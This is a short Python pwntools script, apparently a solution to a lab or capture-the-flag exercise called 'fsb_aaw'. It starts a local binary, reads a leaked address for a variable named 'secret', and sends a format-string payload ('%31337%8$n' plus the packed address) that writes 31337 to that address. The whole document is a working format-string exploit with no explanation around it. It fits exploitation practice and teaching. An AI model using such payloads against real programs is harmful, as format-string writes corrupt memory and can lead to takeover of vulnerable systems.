from pwn import *

p = process('./fsb_aaw')

p.recvuntil(b'`secret`: ')

addr_secret = int(p.recvline()[:-1], 16)

fstring = b'%31337%8$n'.ljust(16)
fstring += p64(addr_secret)

p.sendline(fstring)

print(p.recvall())